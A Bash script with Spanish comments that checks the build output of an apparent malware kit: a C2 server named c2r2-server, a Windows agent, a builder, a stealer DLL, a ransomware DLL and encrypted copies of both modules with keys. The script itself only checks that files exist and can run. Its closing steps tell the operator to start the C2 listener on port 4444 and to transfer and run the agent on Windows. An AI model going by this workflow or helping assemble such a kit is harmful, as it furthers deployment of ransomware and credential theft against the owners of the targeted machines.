#!/bin/bash
# Script de validación para verificar que los binarios compilados funcionan correctamente

set -e

DIST_DIR="./dist"
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo "🔍 Validando binarios compilados..."
echo ""

# Función para verificar un archivo
check_file() {
    local file=$1
    local description=$2
    
    if [ -f "$file" ]; then
        echo -e "${GREEN}✓${NC} $description: ${GREEN}OK${NC}"
        stat -c "  Tamaño: %s bytes" "$file" 2>/dev/null || \
        stat -f "  Tamaño: %z bytes" "$file" 2>/dev/null || \
        echo "  Tamaño: $(wc -c < "$file") bytes"
        return 0
    else
        echo -e "${RED}✗${NC} $description: ${RED}NO ENCONTRADO${NC}"
        return 1
    fi
}

# Verificar que existe el directorio dist
if [ ! -d "$DIST_DIR" ]; then
    echo -e "${RED}❌ Error: Directorio dist/ no existe${NC}"
    echo "   Ejecuta primero: docker-compose up --build"
    exit 1
fi

echo "📋 Verificando componentes principales:"
echo ""

# Verificar servidor
check_file "$DIST_DIR/c2r2-server" "Servidor C2"

# Verificar agente
AGENT_NAME=${AGENT_NAME:-agent}
check_file "$DIST_DIR/${AGENT_NAME}.exe" "Agente Windows"

# Verificar builder
check_file "$DIST_DIR/builder" "Builder"

# Verificar DLLs
echo ""
echo "📦 Verificando módulos DLL:"
echo ""
check_file "$DIST_DIR/stealer.dll" "Stealer DLL"
check_file "$DIST_DIR/ransomware.dll" "Ransomware DLL"

# Verificar módulos encriptados
echo ""
echo "🔐 Verificando módulos encriptados:"
echo ""
check_file "$DIST_DIR/modules/stealer.enc" "Stealer encriptado"
check_file "$DIST_DIR/modules/stealer.key" "Stealer key"
check_file "$DIST_DIR/modules/ransomware.enc" "Ransomware encriptado"
check_file "$DIST_DIR/modules/ransomware.key" "Ransomware key"

# Verificar información de compilación
echo ""
echo "📄 Información de compilación:"
echo ""
if [ -f "$DIST_DIR/BUILD_INFO.txt" ]; then
    cat "$DIST_DIR/BUILD_INFO.txt"
else
    echo -e "${YELLOW}⚠️  BUILD_INFO.txt no encontrado${NC}"
fi

# Verificar permisos ejecutables
echo ""
echo "🔒 Verificando permisos ejecutables:"
echo ""

if [ -x "$DIST_DIR/c2r2-server" ]; then
    echo -e "${GREEN}✓${NC} c2r2-server tiene permisos de ejecución"
else
    echo -e "${YELLOW}⚠️${NC}  c2r2-server no tiene permisos de ejecución"
    echo "   Ejecuta: chmod +x $DIST_DIR/c2r2-server"
fi

if [ -x "$DIST_DIR/builder" ]; then
    echo -e "${GREEN}✓${NC} builder tiene permisos de ejecución"
else
    echo -e "${YELLOW}⚠️${NC}  builder no tiene permisos de ejecución"
    echo "   Ejecuta: chmod +x $DIST_DIR/builder"
fi

# Resumen final
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

TOTAL_SIZE=$(du -sh "$DIST_DIR" | cut -f1)
echo -e "${GREEN}✅ Validación completada${NC}"
echo "📦 Tamaño total: $TOTAL_SIZE"
echo ""
echo "Próximos pasos:"
echo "  1. Ejecutar servidor: cd dist && ./c2r2-server --bind 0.0.0.0 --port 4444"
echo "  2. Transferir agente: dist/${AGENT_NAME}.exe"
echo "  3. Ejecutar agente en Windows"
echo ""
